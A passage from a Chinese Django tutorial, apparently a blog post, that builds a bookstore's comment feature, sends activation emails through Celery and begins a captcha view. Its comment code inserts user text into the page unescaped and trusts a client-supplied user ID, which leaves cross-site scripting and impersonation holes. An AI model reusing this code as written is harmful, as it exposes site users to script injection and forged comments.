Books.objects.get(id=book_id)</span><br><span class="line">        user = Passport.objects.get(id=user_id)</span><br><span class="line"></span><br><span class="line">        comment = Comments(book=book, user=user, content=content)</span><br><span class="line">        comment.save()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;</span><br><span class="line">                <span class="string">'code'</span>: <span class="number">200</span>,</span><br><span class="line">                <span class="string">'msg'</span>: <span class="string">'评论成功'</span>,</span><br><span class="line">            &#125;)</span><br></pre></td></tr></table></figure></p><p>然后注册url。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 根urls.py: bookstore: urls.py</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    ...</span><br><span class="line">    url(<span class="string">r'^comment/'</span>, include(<span class="string">'comments.urls'</span>, namespace=<span class="string">'comment'</span>)), <span class="comment"># 评论模块</span></span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>comments app的url注册。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> comments <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'comment/(?P&lt;books_id&gt;\d+)/$'</span>, views.comment, name=<span class="string">'comment'</span>), <span class="comment"># 评论内容</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p><p>注册好url以后，我们要编写detail.html里面的前端代码了。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"operate_btn"</span>&gt;</span></span><br><span class="line">    &#123; % csrf_token %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">class</span>=<span class="string">"buy_btn"</span>&gt;</span>立即购买<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">books_id</span>=<span class="string">"&#123;&#123; books.id &#125;&#125;"</span> <span class="attr">class</span>=<span class="string">"add_cart"</span> <span class="attr">id</span>=<span class="string">"add_cart"</span>&gt;</span>加入购物车<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">id</span>=<span class="string">"write-comment"</span> <span class="attr">class</span>=<span class="string">"comment"</span>&gt;</span>我要写评论<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:flex;"</span> <span class="attr">id</span>=<span class="string">"comment-input"</span> <span class="attr">data-bookid</span>=<span class="string">"&#123;&#123; books.id &#125;&#125;"</span> <span class="attr">data-userid</span>=<span class="string">"&#123;&#123; request.session.passport_id &#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"评论内容"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"submit-comment"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span></span><br><span class="line">          提交评论</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>再增加id-book_detail 和id-book_comment 增加点击效果<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"r_wrap fr clearfix"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"detail_tab clearfix"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span> <span class="attr">id</span>=<span class="string">"detail"</span>&gt;</span>商品介绍<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">"comment"</span>&gt;</span>评论<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab_content"</span> &gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span> <span class="attr">id</span>=<span class="string">"book_detail"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>商品详情：<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span>&#123;&#123; books.detail | safe &#125;&#125;<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span> <span class="attr">id</span>=<span class="string">"book_comment"</span> <span class="attr">style</span>=<span class="string">"display: none; font-size: 15px; color: #0a0a0a"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>用户评论:<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>然后写样式。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line"><span class="selector-class">.comment</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#c40000</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">10</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">178px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">38px</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#c40000</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">14px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">38px</span>;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure></p><p>以及提交评论的js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取评论</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/comment/comment/'</span> + $(<span class="string">'#comment-input'</span>).data(<span class="string">'bookid'</span>),</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (res.code === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> data = res.data;</span><br><span class="line">            <span class="built_in">console</span>.log(data);</span><br><span class="line">            <span class="keyword">var</span> div_head = <span class="string">'&lt;div&gt;'</span>;</span><br><span class="line">            <span class="keyword">var</span> div_tail = <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">            <span class="keyword">var</span> dom_element = <span class="string">''</span></span><br><span class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">                <span class="keyword">var</span> head = <span class="string">'&lt;div&gt;'</span>;</span><br><span class="line">                <span class="keyword">var</span> tail = <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">                <span class="keyword">var</span> temp = head + <span class="string">'&lt;span&gt;'</span> + data[i].user_id + <span class="string">'&lt;/span&gt;'</span> + <span class="string">'&lt;br&gt;'</span> + <span class="string">'&lt;span&gt;'</span> + data[i].content + <span class="string">'&lt;/span&gt;'</span> + tail;</span><br><span class="line">                dom_element += temp;</span><br><span class="line">            &#125;</span><br><span class="line">            dom_element = div_head + dom_element + div_tail;</span><br><span class="line">            $(<span class="string">'#book_comment'</span>).append(dom_element);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">$(<span class="string">'#detail'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="keyword">this</span>).addClass(<span class="string">'active'</span>);</span><br><span class="line">    $(<span class="string">'#comment'</span>).removeClass(<span class="string">'active'</span>);</span><br><span class="line">    $(<span class="string">'#book_comment'</span>).hide();</span><br><span class="line">    $(<span class="string">'#book_detail'</span>).show();</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">'#comment'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="keyword">this</span>).addClass(<span class="string">'active'</span>);</span><br><span class="line">    $(<span class="string">'#detail'</span>).removeClass(<span class="string">'active'</span>);</span><br><span class="line">    $(<span class="string">'#book_comment'</span>).show();</span><br><span class="line">    $(<span class="string">'#book_detail'</span>).hide();</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">'#write-comment'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $(<span class="string">'#comment-input'</span>).show();</span><br><span class="line">&#125;)</span><br><span class="line">$(<span class="string">'#submit-comment'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> book_id = $(<span class="string">'#comment-input'</span>).data(<span class="string">'bookid'</span>);</span><br><span class="line">    <span class="keyword">var</span> user_id = $(<span class="string">'#comment-input'</span>).data(<span class="string">'userid'</span>);</span><br><span class="line">    <span class="keyword">var</span> content = $(<span class="string">'#comment-input input'</span>).val();</span><br><span class="line">    <span class="keyword">var</span> data = &#123;</span><br><span class="line">        book_id: book_id,</span><br><span class="line">        user_id: user_id,</span><br><span class="line">        content: content,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'content: '</span>, content);</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        url: <span class="string">'/comment/comment/'</span> + book_id + <span class="string">'/'</span>,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(data),</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (res.code === <span class="number">200</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log('res: ', res)</span></span><br><span class="line">                $(<span class="string">'#comment-input'</span>).hide();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>这样评论功能就做好了。</p><h1 id="9，发送邮件功能实现。"><a href="#9，发送邮件功能实现。" class="headerlink" title="9，发送邮件功能实现。"></a><a id="9">9，发送邮件功能实现。</a></h1><h2 id="1，同步发送邮件"><a href="#1，同步发送邮件" class="headerlink" title="1，同步发送邮件"></a>1，同步发送邮件</h2><p>先在配置文件中配置邮件相关参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># settings.py</span></span><br><span class="line">EMAIL_BACKEND = <span class="string">'django.core.mail.backends.smtp.EmailBackend'</span></span><br><span class="line">EMAIL_HOST = <span class="string">'smtp.126.com'</span></span><br><span class="line"><span class="comment"># 126和163邮箱的SMTP端口为25； QQ邮箱使用的SMTP端口为465</span></span><br><span class="line">EMAIL_PORT = <span class="number">25</span></span><br><span class="line"><span class="comment"># 如果使用QQ邮箱发送邮件，需要开启SSL加密, 如果在aliyun上部署，也需要开启ssl加密，同时修改端口为EMAIL_PORT = 465</span></span><br><span class="line"><span class="comment"># EMAIL_USE_SSL = True</span></span><br><span class="line"><span class="comment"># 发送邮件的邮箱</span></span><br><span class="line">EMAIL_HOST_USER = <span class="string">'xxxxxxxx@126.com'</span></span><br><span class="line"><span class="comment"># 在邮箱中设置的客户端授权密码</span></span><br><span class="line">EMAIL_HOST_PASSWORD = <span class="string">'xxxxxxxx'</span></span><br><span class="line"><span class="comment"># 收件人看到的发件人</span></span><br><span class="line">EMAIL_FROM = <span class="string">'shangguigu&lt;xxxxxxxx@126.com&gt;'</span></span><br></pre></td></tr></table></figure><p>在注册页的视图函数里写发邮件的代码。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> TimedJSONWebSignatureSerializer <span class="keyword">as</span> Serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> SignatureExpired</span><br></pre></td></tr></table></figure></p><p>itsdangerous是一个产生token的库，有flask的作者编写。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_handle</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">'''进行用户注册处理'''</span></span><br><span class="line">    <span class="comment"># 接收数据</span></span><br><span class="line">    username = request.POST.get(<span class="string">'user_name'</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">'pwd'</span>)</span><br><span class="line">    email = request.POST.get(<span class="string">'email'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行数据校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> all([username, password, email]):</span><br><span class="line">        <span class="comment"># 有数据为空</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>:<span class="string">'参数不能为空!'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断邮箱是否合法</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">r'^[a-z0-9][\w\.\-]*@[a-z0-9\-]+(\.[a-z]&#123;2,5&#125;)&#123;1,2&#125;$'</span>, email):</span><br><span class="line">        <span class="comment"># 邮箱不合法</span></span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>:<span class="string">'邮箱不合法!'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    p = Passport.objects.check_passport(username=username)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">'users/register.html'</span>, &#123;<span class="string">'errmsg'</span>: <span class="string">'用户名已存在！'</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 进行业务处理:注册，向账户系统中添加账户</span></span><br><span class="line">    <span class="comment"># Passport.objects.create(username=username, password=password, email=email)</span></span><br><span class="line">    passport = Passport.objects.add_one_passport(username=username, password=password, email=email)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成激活的token itsdangerous</span></span><br><span class="line">    serializer = Serializer(settings.SECRET_KEY, <span class="number">3600</span>)</span><br><span class="line">    token = serializer.dumps(&#123;<span class="string">'confirm'</span>:passport.id&#125;) <span class="comment"># 返回bytes</span></span><br><span class="line">    token = token.decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 给用户的邮箱发激活邮件</span></span><br><span class="line">    send_mail(<span class="string">'尚硅谷书城用户激活'</span>, <span class="string">''</span>, settings.EMAIL_FROM, [email], html_message=<span class="string">'&lt;a href="http://127.0.0.1:8000/user/active/%s/"&gt;http://127.0.0.1:8000/user/active/&lt;/a&gt;'</span> % token)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 注册完，还是返回注册页。</span></span><br><span class="line">    <span class="keyword">return</span> redirect(reverse(<span class="string">'books:index'</span>))</span><br></pre></td></tr></table></figure></p><p>register_handle函数变为以上代码，增加了发送邮件的功能。注意这里我们没有实现check_passport函数。所以要在<code>users/models.py</code>中的<code>PassportManager</code>中实现这个函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PassportManager</span><span class="params">(models.Manager)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_passport</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            passport = self.get(username=username)</span><br><span class="line">        <span class="keyword">except</span> self.model.DoesNotExist:</span><br><span class="line">            passport = <span class="keyword">None</span></span><br><span class="line">        <span class="keyword">if</span> passport:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><h2 id="2，使用消息队列celery来异步发送邮件。"><a href="#2，使用消息队列celery来异步发送邮件。" class="headerlink" title="2，使用消息队列celery来异步发送邮件。"></a>2，使用消息队列celery来异步发送邮件。</h2><p>首先配置celery。在bookstore文件夹下面。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bookstore/celery.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># set the default Django settings module for the 'celery' program.</span></span><br><span class="line">os.environ.setdefault(<span class="string">'DJANGO_SETTINGS_MODULE'</span>, <span class="string">'bookstore.settings'</span>)</span><br><span class="line"></span><br><span class="line">app = Celery(<span class="string">'bookstore'</span>, broker=<span class="string">'redis://127.0.0.1:6379/6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Using a string here means the worker doesn't have to serialize</span></span><br><span class="line"><span class="comment"># the configuration object to child processes.</span></span><br><span class="line"><span class="comment"># - namespace='CELERY' means all celery-related configuration keys</span></span><br><span class="line"><span class="comment">#   should have a `CELERY_` prefix.</span></span><br><span class="line">app.config_from_object(<span class="string">'django.conf:settings'</span>, namespace=<span class="string">'CELERY'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load task modules from all registered Django app configs.</span></span><br><span class="line">app.autodiscover_tasks()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.task(bind=True)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_task</span><span class="params">(self)</span>:</span></span><br><span class="line">    print(<span class="string">'Request: &#123;0!r&#125;'</span>.format(self.request))</span><br></pre></td></tr></table></figure></p><p>然后在users app中编写异步任务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/tasks.py</span></span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> shared_task</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">from</span> django.core.mail <span class="keyword">import</span> send_mail</span><br><span class="line"></span><br><span class="line"><span class="meta">@shared_task</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_active_email</span><span class="params">(token, username, email)</span>:</span></span><br><span class="line">    <span class="string">'''发送激活邮件'''</span></span><br><span class="line">    subject = <span class="string">'尚硅谷书城用户激活'</span> <span class="comment"># 标题</span></span><br><span class="line">    message = <span class="string">''</span></span><br><span class="line">    sender = settings.EMAIL_FROM <span class="comment"># 发件人</span></span><br><span class="line">    receiver = [email] <span class="comment"># 收件人列表</span></span><br><span class="line">    html_message = <span class="string">'&lt;a href="http://127.0.0.1:8000/user/active/%s/"&gt;http://127.0.0.1:8000/user/active/&lt;/a&gt;'</span>%token</span><br><span class="line">    send_mail(subject, message, sender, receiver, html_message=html_message)</span><br></pre></td></tr></table></figure></p><p>然后在视图函数中导入异步任务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> users.tasks <span class="keyword">import</span> send_active_email</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register_handle</span><span class="params">(request)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    send_active_email.delay(token, username, email)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure></p><p>然后改写根应用文件夹里的<strong>init</strong>.py，将整个文件改为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"><span class="comment"># This will make sure the app is always imported when</span></span><br><span class="line"><span class="comment"># Django starts so that shared_task will use this app.</span></span><br><span class="line"><span class="keyword">from</span> .celery <span class="keyword">import</span> app <span class="keyword">as</span> celery_app</span><br><span class="line"></span><br><span class="line">__all__ = [<span class="string">'celery_app'</span>]</span><br></pre></td></tr></table></figure></p><p>然后运行:(在根目录，和manage.py同级)<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ celery -A <span class="keyword">bookstore </span>worker -l <span class="meta">info</span></span><br></pre></td></tr></table></figure></p><h1 id="10，登陆验证码功能实现"><a href="#10，登陆验证码功能实现" class="headerlink" title="10，登陆验证码功能实现"></a><a id="10">10，登陆验证码功能实现</a></h1><p>将项目中的<code>Ubuntu-RI.ttf</code>字体文件拷贝到你的项目的根目录下面。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># users/views.py</span></span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.conf <span class="keyword">import</span> settings</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verifycode</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment">#引入绘图模块</span></span><br><span class="line">    <span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line">    <span class="comment">#引入随机函数模块</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="comment">#定义变量，用于画面的背景色、宽、高</span></span><br><span class="line">    bgcolor = (random.randrange(<span class="number">20</span>, <span class="number">100</span>), random.randrange(</span><br><span class="line">        <span class="number">20</span>, <span class="number">100</span>), <span class="number">255</span>)</span><br><span class="line">    width = <span class="number">100</span></span><br><span class="line">    